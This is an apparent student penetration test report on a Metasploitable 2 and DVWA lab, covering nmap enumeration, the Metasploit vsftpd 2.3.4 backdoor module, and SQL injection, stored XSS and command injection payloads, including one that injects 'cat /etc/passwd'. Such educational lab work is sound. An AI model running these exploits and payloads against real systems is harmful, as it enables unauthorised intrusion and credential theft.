# Penetration Test Report — Metasploitable 2 Lab

**Date:** September 2026
**Tester:** Nika Loliashvili
**Target:** Metasploitable 2 (192.168.56.101)
**Attacker:** Kali Linux (192.168.56.102)
**Scope:** Network service enumeration, vulnerability exploitation, and web application testing

## 1. Executive Summary

This report documents a penetration test conducted against the intentionally vulnerable Metasploitable 2 virtual machine. The objective was to practice the penetration testing lifecycle — reconnaissance, enumeration, exploitation, and documentation — using industry-standard tools. Multiple critical vulnerabilities were identified, including a backdoored FTP service and weak authentication mechanisms, leading to full system compromise.

## 2. Reconnaissance & Enumeration

### 2.1 Host Discovery

The target IP was identified using an Nmap ping sweep of the internal subnet.

```bash
nmap -sn 192.168.56.0/24
```

### 2.2 Service Enumeration

An aggressive service scan was performed to identify open ports, running services, and potential vulnerabilities.

```bash
nmap -sV -sC -O 192.168.56.101
```

**Key Findings:**

| Port | Service | Version | Risk |
|------|---------|---------|------|
| 21 | FTP | vsftpd 2.3.4 | **Critical** — Known backdoor |
| 22 | SSH | OpenSSH 4.7p1 | High — Weak credentials possible |
| 23 | Telnet | Linux telnetd | High — Plaintext protocol |
| 80 | HTTP | Apache 2.2.8 | Medium — Web app vulnerabilities |
| 445 | Samba | Samba 3.0.20 | High — Known exploits |
| 3306 | MySQL | MySQL 5.0.51a | High — Default/weak credentials |

## 3. Exploitation

### 3.1 FTP Backdoor (vsftpd 2.3.4)

**Vulnerability:** vsftpd 2.3.4 contains a malicious backdoor (CVE-2011-2523). When a username ending in `:)` is submitted, a shell listener opens on port 6200.

**Exploitation via Metasploit:**

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
run
```

**Result:** Root shell obtained directly without privilege escalation.

**Remediation:** Upgrade vsftpd to a patched version. Verify software integrity using checksums before deployment.

### 3.2 Web Application Testing — DVWA

The Damn Vulnerable Web Application was accessed at `http://192.168.56.101/dvwa`.

#### SQL Injection

**Vulnerability:** The "User ID" field in the SQL Injection module accepts unsanitized input.

**Payload:**

```sql
1' UNION SELECT null, username FROM users--
```

**Impact:** Database enumeration, credential exposure.

**Remediation:** Implement parameterized queries (prepared statements) and input validation.

#### Cross-Site Scripting (XSS)

**Vulnerability:** The "Name" field in the Stored XSS module does not sanitize HTML/JavaScript input.

**Payload:**

```html
<script>alert('XSS')</script>
```

**Impact:** Session hijacking, credential theft, defacement.

**Remediation:** Implement output encoding (HTML entity encoding) and Content Security Policy (CSP).

#### Command Injection

**Vulnerability:** The "IP Address" field in the Command Execution module passes input directly to the system shell.

**Payload:**

```
192.168.1.1; cat /etc/passwd
```

**Impact:** Remote code execution, full system compromise.

**Remediation:** Use allowlists for input, avoid shell execution of user input, and implement proper input sanitization.

## 4. Conclusion

This lab demonstrated how a single unpatched service (vsftpd backdoor) and insecure coding practices can lead to complete system compromise. The exercise reinforced the importance of:

- Regular vulnerability scanning and patch management
- Secure coding practices (input validation, parameterized queries, output encoding)
- Network segmentation and minimizing the attack surface

*This report was created for educational purposes in a controlled lab environment.*
